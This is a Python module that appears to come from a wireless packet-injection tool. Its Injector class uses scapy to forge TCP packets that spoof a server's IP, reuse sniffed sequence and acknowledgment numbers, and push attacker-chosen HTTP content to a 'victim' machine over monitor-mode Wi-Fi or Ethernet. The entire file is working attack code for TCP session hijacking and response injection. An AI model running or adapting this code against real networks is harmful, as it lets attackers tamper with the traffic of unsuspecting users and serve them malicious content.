from lib.headers import Headers
from lib.visuals import bcolors
from scapy.all import *
import fcntl, socket, struct, sys, time

global npackets
npackets = 0

### Verify these can be removed
#global BLOCK_HOSTS
#BLOCK_HOSTS = set()


class Injector(object):
    """Uses scapy to inject packets on the networks"""

    def __init__(self, interface):
        self.interface = interface


    def getHwAddr(self, ifname):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', ifname[:15]))
        mac=':'.join(['%02x' % ord(char) for char in info[18:24]])
        return mac


    def float_to_hex(self,f):
        return hex(struct.unpack('<I', struct.pack('<f', f))[0])


    ### Should be able to dict this?
    def inject(self, vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr, exp, expSocket, single = False):
        """Inject function performs the actual injection using scapy."""
        global npackets
        npackets += 1
        #sys.stdout.write(bcolors.OKBLUE + "[*] Injecting Packet to victim " + vicmac + " (TOTAL: " + str(npackets) + " injected packets)\r" + bcolors.ENDC)
        sys.stdout.write(bcolors.OKBLUE + "[*] Injecting Packet to victim " + bcolors.WARNING + vicmac + bcolors.OKBLUE + " (TOTAL: " + str(npackets) + " injected packets)\r" + bcolors.ENDC)
        sys.stdout.flush()
        if ("mon" in self.interface):
            hdr = Headers()
            headers = hdr.default(injection)
            ### We should use the \ format here to make this a lot more readable
            if (TSVal is not None and TSecr is not None):
                packet = RadioTap()/Dot11(FCfield = 'from-DS', addr1 = vicmac, addr2 = rtrmac, addr3 = rtrmac)/LLC()/SNAP()/IP(dst = vicip, src = svrip)/TCP(flags = "FA", sport = int(svrport), dport = int(vicport), seq = int(seqnum), ack = int(acknum), options = [('NOP', None), ('NOP', None), ('Timestamp', ((round(time.time()), TSVal)))])/Raw(load = headers + injection)
            else:
                packet = RadioTap()/Dot11(FCfield = 'from-DS', addr1 = vicmac, addr2 = rtrmac, addr3 = rtrmac)/LLC()/SNAP()/IP(dst = vicip, src = svrip)/TCP(flags = "FA", sport = int(svrport), dport = int(vicport), seq = int(seqnum), ack = int(acknum), options = [('NOP', None), ('NOP', None), ('Timestamp', ((round(time.time()), 0)))])/Raw(load = headers + injection)

            ### Experimental mode
            if exp:
                try:
                    sendp(packet, iface = self.interface, verbose = 0)
                except:
                    pass

            else:
                try:
                    sendp(packet, iface = self.interface, verbose = 0)
                except:
                    pass


            if single:
                #sys.stdout.write(bcolors.OKBLUE + "[*] Injecting Packet to victim " + vicmac + " (TOTAL: " + str(npackets) + " injected packets)\r\n" + bcolors.ENDC)
                sys.stdout.write(bcolors.OKBLUE + "[*] Injecting Packet to victim " + bcolors.WARNING + vicmac + bcolors.OKBLUE + " (TOTAL: " + str(npackets) + " injected packets)\r" + bcolors.ENDC)
                time.sleep(1)
                exit(1)

        else:
            hdr = Headers()
            headers = hdr.default(injection)
            if (TSVal is not None):
                ### We should use the \ format here to make this a lot more readable
                packet = Ether(src = self.getHwAddr(self.interface), dst = vicmac)/IP(dst = vicip, src = svrip)/TCP(flags = "FA", sport = int(svrport), dport = int(vicport), seq = int(seqnum), ack = int(acknum), options = [('NOP', None), ('NOP', None), ('Timestamp', ((round(time.time()), TSVal)))])/Raw(load = headers + injection)
            else:
                packet = Ether(src = self.getHwAddr(self.interface), dst = vicmac)/IP(dst = vicip, src = svrip)/TCP(flags = "FA", sport = int(svrport), dport = int(vicport), seq = int(seqnum), ack = int(acknum), options = [('NOP', None), ('NOP', None), ('Timestamp', ((round(time.time()), 0)))])/Raw(load = headers + injection)


            ### Experimental mode
            if exp:
                try:
                    sendp(packet,iface = self.interface, verbose = 0)
                except:
                    pass
            else:
                try:
                    sendp(packet,iface = self.interface, verbose = 0)
                except:
                    pass

            return
